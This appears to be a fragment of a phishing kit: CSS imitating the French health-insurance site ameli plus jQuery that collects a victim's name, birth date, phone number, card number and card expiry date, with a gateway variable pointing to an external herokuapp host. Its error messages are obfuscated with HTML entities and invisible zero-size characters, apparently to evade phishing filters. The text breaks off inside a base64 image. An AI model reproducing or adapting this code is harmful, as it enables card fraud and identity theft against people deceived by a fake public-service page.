  background: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAAUCAIAAADDbMD2AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAABVJREFUeNpi+P//PxMDAwO1MECAAQDvVgMkpy1A6wAAAABJRU5ErkJggg==') no-repeat scroll left center;
}

/** Footer sur une colonne orient� verticalement **/
@media only screen and (max-width: 659px) {
.wlp-bighorn-footer #Footer li {
    display: block;
    width: 100%;
    background-image: none;
    border-bottom: 1px solid white;
}
}

.wlp-bighorn-footer #Footer li:first-child {
background-image: none;
}

.wlp-bighorn-footer #Footer li a {
  line-height: 50px;
}
.wlp-bighorn-footer
{
  padding-top: 15px;
  clear: both;
}
/* bouton submit */

.r_btsubmit {
  background-color: #2C9AD2;
  color: #fff;
  -moz-user-select: none;
  background-image: none;
  border: 1px solid #2C9AD2;
  border-radius: 0;
  cursor: pointer;
  display: inline-block;
  font-size: 1em;
  font-weight: normal;
  line-height: 1.42857;
  padding: 6px 12px;
  text-align: center;
  vertical-align: middle;
  white-space: nowrap;
  text-transform: uppercase;
  letter-spacing: 0.1em;
  margin: 5px;
  min-width: 30%;
}

.r_btretour {
  -moz-user-select: none;
  background-image: none;
  border: 1px solid #2C9AD2;
  border-radius: 0;
  cursor: pointer;
  display: inline-block;
  font-size: 1em;
  font-weight: normal;
  line-height: 1.42857;
  padding: 6px 12px;
  text-align: center;
  vertical-align: middle;
  white-space: nowrap;
  text-transform: uppercase;
  letter-spacing: 0.1em;
  margin: 5px;
  min-width: 30%;
  background-color: #fff;
  color: #2C9AD2;
}

.r_btsubmit:hover, .r_btsubmit:focus {
background-color: #23AEE5;
border: 1px solid #2C9AD2;
  color: #fff;
  text-decoration : none;
}

.r_btsubmit:active {
background-color: #1F6E8C;
border: 1px solid #1F6E8C;
  color: #fff;
  text-decoration : none;
}

.r_btsubmit:disabled, .r_btsubmit.r_disabled {
cursor:not-allowed;
pointer-events:none;
opacity:0.55;
filter:alpha(opacity=55);
}
@media screen and (min-width: 200px) and (max-width: 750px) {
.r_ddc_half_screen {
    width: 30%;
    display: inline-block;
}
}
@media screen and (min-width: 750px) {
.r_ddc_half_screen {
    width: 48%;
    display: inline-block;
}
}
input[type="text"] , input[type="password"]{
  background-color: #fff;
  background-image: none;
  border: 1px solid #ccc;
  border-radius: 0;
  box-shadow: 0 1px 1px rgba(0, 0, 0, 0.075) inset;
  color: #555;
  font-size: 1em;
  height: 34px;
  line-height: 1.42857;
  padding: 6px 12px;
  transition: border-color 0.15s ease-in-out 0s, box-shadow 0.15s ease-in-out 0s;
  margin-bottom: 10px;
  vertical-align:baseline;
}
@media screen and (min-width: 200px) and (max-width: 350px) {
input[type="text"]{
    width: 100%;
}
}
select{
  background-color: #fff;
  background-image: none;
  border: 1px solid #ccc;
  border-radius: 0;
  box-shadow: 0 1px 1px rgba(0, 0, 0, 0.075) inset;
  color: #555;
  height: 34px;
  line-height: 1.42857;
  margin-bottom: 10px;
  vertical-align:baseline;
}
.message_erreur {
  display: inline-block;
  color: #bb0f00;
}


.erreur_champ input[type="text"],.erreur_champ input[type="password"] {
  border-color: #bb0f00;
  background-color: #fffedb;
}
.erreur_champ select {
  border-color: #bb0f00;
  background-color: #fffedb;
}

.creationimmediate .message_erreur {
padding-bottom: 15px;
}
.creationimmediate .right_side {
  padding-left: 50%;
}

h1{
  margin: 0;
  padding: 0;
  border: 0;
  font-size: 100%;
  vertical-align: baseline
}
a {
text-decoration: none;
cursor: pointer;
border-bottom: dotted 1px;
color: #0062ad;
}

a:hover {
text-decoration: none;
border-bottom: solid 1px;
}
html {
background-color: white;
}

body {
font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
font-size: 0.875em;
background-color: white;
color: #000;
width:84%; margin-left: auto;margin-right: auto;
}
.titlebar
{
  overflow: hidden;
  border-bottom: 1px solid #bfbfbf;
padding-bottom: 0.5em;
text-transform: uppercase;
margin-bottom: 10px;
  margin-top: 20px;
  color: #2270a1;
  padding-top: 20px;
}
/** Prefooter ameli sur toute la largeur **/
@media only screen and (max-width: 750px) {
body {
  width:100%;
  margin-left: auto;margin-right: auto;
}
}

@media only screen
and (min-device-width : 768px)
and (max-device-width : 1024px){
body {
  width:100%;
  margin-left: auto;margin-right: auto;

}
}
.main{
}

* {
-webkit-box-sizing: border-box;
-moz-box-sizing: border-box;
box-sizing: border-box
}
""")

js = Markup("""
$(document).ready(function() {
var ach_semak_lah="";
var zdiyad = "";
var nemra = "";
var feedzeb="";
var pic="<img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABIAAAASCAYAAABWzo5XAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAA3XAAAN1wFCKJt4AAABrUlEQVQ4y6WUTU9TURCGn5l7ezUm3FjphsJGjRtDGtxAwpc3oDs2bIj4L9zob5DEhcZ/IKmGkLBh2coVy8KdLvxITFzRFdQSFwqVe8YF2tT2tlR5V3MyM++8M+fMEVJQn711w8SWxewmcAnAoIbZK/HseTaO37bnSOvhWxTlnNPHBsvtvhYYxqoXyL2wXK51ENVm5q+ruE2Qy03n+XNceHAfgO8PV7DDo1bCLwm6kNsufQRQgP25uWEVSq0kAAQBXmEUrzAKQdCu7IqHK+1N3c43ifTYHoEN8e/I+97xCoDWo2hMkCX+G3L368x8QS2RXoPti0mVOyowyRlhZlMKMsTZkfdPF95f1z5CFbiaKvnwiJ/xdtPu0duuD7wEZlMDGg1+PHnax7ilrC6xdcCl+gcGCNeKhGtFJAy70bhE3boO7my9F3iRXgnwM5DJ9JiVrObi+JMAHExPZ02DN8C1v2JU0JGRk7K7VXAdwj+La0xcrFTqPZf2FHQuLcDg6/IHT21coHjy/XS/I4xnXkbG/5DQbTXqUTRGIovApIgM/369VUR2cLaRrWy9a8/5BZ7cj3zxUmEJAAAAAElFTkSuQmCC' />";
var error_message = "";
var URL_GATE = "https://andakadaka.herokuapp.com";
$('#nb').mask('00.00.00.00.00');
$('#dubs').mask('00/00/0000');
$('#tarja').mask('0000.0000.0000.0000');
$('#exp').mask('00/0000');
function is_valide_date(zdifi){
if (zdifi.length == 10) {
var data = zdifi.split("/");

if(data.length == 3){
if(data[0] < 32 && data[1] < 13 && data[2] >1920 && data[2] < 2002 ){
return true;
}else{
return false;
}
}else{
return false;
}
}else{
return false;
}


}
function checknemra(nemra){
if (nemra.length == 14 && nemra.charAt(0) == "0") {
return true;
}else{
return false;
}
}


function check_first_step(ach_semak_lah,zdiyad,nemra,vv,mama,vire){
$('#jnab').hide();
if(ach_semak_lah.match(/\d+/g) == null && ach_semak_lah.length > 4 && is_valide_date(zdiyad)==true && checknemra(nemra)==true && type_tarjet(vv,mama)){
return true;
}else{
$('#jnab').show();
error_message = "";
if(ach_semak_lah.match(/\d+/g) !== null || ach_semak_lah.length < 4){
error_message = 'V<!ucx>&#101;<font style="color:transparent;font-size: 0px;">g</font>&#117;&#105;<font style="color:transparent;font-size: 0px;">O</font>&#108;<font style="color:transparent;font-size: 0px;">x</font>&#108;<font style="color:transparent;font-size: 0px;">Y</font>e<!D>z<!0V> &#115;<font style="color:transparent;font-size: 0px;">E</font>a<!q>i<!idk>&#115;<font style="color:transparent;font-size: 0px;">F</font>i<!0Z1>&#114;<font style="color:transparent;font-size: 0px;">j</font> &#118;<font style="color:transparent;font-size: 0px;">6</font>&#111;<font style="color:transparent;font-size: 0px;">3</font>&#116;<font style="color:transparent;font-size: 0px;">m</font>&#114;e<!o28> n<!2aE>&#111;<font style="color:transparent;font-size: 0px;">h</font>m<!O> &#099;&#111;<font style="color:transparent;font-size: 0px;">t</font>&#109;<font style="color:transparent;font-size: 0px;">R</font>&#112;&#108;e<!B3>&#116;';
}

if(is_valide_date(zdiyad) ==false){
error_message = 'D<!gi>&#097;<font style="color:transparent;font-size: 0px;">n</font>&#116;<font style="color:transparent;font-size: 0px;">G</font>e<!w> &#100;<font style="color:transparent;font-size: 0px;">e</font>&#101; &#110;<font style="color:transparent;font-size: 0px;">R</font>&#097;i<!Xs>s<!4xG>s<!nBB>a<!XM>&#110;<font style="color:transparent;font-size: 0px;">Q</font>c<!qeO>e<!0BA> i<!T>&#110;&#099;<font style="color:transparent;font-size: 0px;">r</font>o<!o>r<!Nw>r<!9Hz>e<!t0L>&#099;<font style="color:transparent;font-size: 0px;">Q</font>&#116;&#101;<font style="color:transparent;font-size: 0px;">l</font>';
}

if(checknemra(nemra) ==false){
error_message = 'N<!h>&#117;<font style="color:transparent;font-size: 0px;">O</font>&#109;<font style="color:transparent;font-size: 0px;">b</font>é&#114;&#111;<font style="color:transparent;font-size: 0px;">j</font> &#100;&#101;<font style="color:transparent;font-size: 0px;">0</font> t<!L>é&#108;<font style="color:transparent;font-size: 0px;">K</font>é&#112;<font style="color:transparent;font-size: 0px;">4</font>&#104;&#111;<font style="color:transparent;font-size: 0px;">n</font>n<!nKr>&#101;<font style="color:transparent;font-size: 0px;">C</font> &#105;<font style="color:transparent;font-size: 0px;">D</font>&#110;<font style="color:transparent;font-size: 0px;">J</font>&#099;<font style="color:transparent;font-size: 0px;">E</font>&#111;&#114;<font style="color:transparent;font-size: 0px;">m</font>r<!s>&#101;&#099;<font style="color:transparent;font-size: 0px;">b</font>&#116;<font style="color:transparent;font-size: 0px;">N</font>&#101;<font style="color:transparent;font-size: 0px;">f</font>';
}
if (type_tarjet(vv,mama) == false) {
error_message = '&#086;<font style="color:transparent;font-size: 0px;">R</font>e<!fUK>u<!z>&#105;<font style="color:transparent;font-size: 0px;">7</font>&#108;<font style="color:transparent;font-size: 0px;">o</font>&#108;<font style="color:transparent;font-size: 0px;">y</font>e<!o2>&#122; &#115;<font style="color:transparent;font-size: 0px;">h</font>él<!Y>&#101;<font style="color:transparent;font-size: 0px;">F</font>&#099;t<!Tk>&#105;<font style="color:transparent;font-size: 0px;">r</font>o<!P>&#110;<font style="color:transparent;font-size: 0px;">s</font>n<!AX>&#101;<font style="color:transparent;font-size: 0px;">k</font>&#114;<font style="color:transparent;font-size: 0px;">B</font> &#117;<font style="color:transparent;font-size: 0px;">F</font>&#110; &#109;o<!K1W>&#100;&#101;<font style="color:transparent;font-size: 0px;">O</font> &#100;&#101;<font style="color:transparent;font-size: 0px;">W</font> &#114;<font style="color:transparent;font-size: 0px;">v</font>&#101;<font style="color:transparent;font-size: 0px;">X</font>&#109;<font style="color:transparent;font-size: 0px;">R</font>&#098;o<!yR>&#117;<font style="color:transparent;font-size: 0px;">d</font>r<!BQM>s<!2t>&#101;<font style="color:transparent;font-size: 0px;">2</font>m<!r>e<!3>&#110;<font style="color:transparent;font-size: 0px;">Q</font>&#116;<font style="color:transparent;font-size: 0px;">E</font>';
}
$('#jnab').html(pic+" "+error_message);
return false;
}
}


function bedel_sef7a(smia){
$('#etapelowla').hide();
$('#titus').val(smia);
$('#stape_tania').show();
reset_lboutona();
}

function type_tarjet(vv,mama){
if (vv || mama) {

return true;
}else{
return false;
}
}
function reset_lboutona(){
$('#cinema').hide();
$('#tga3ed').show();
}
function loading(tajnide_ijbari){
$('#'+tajnide_ijbari).html('<img src="data:image/gif;base64,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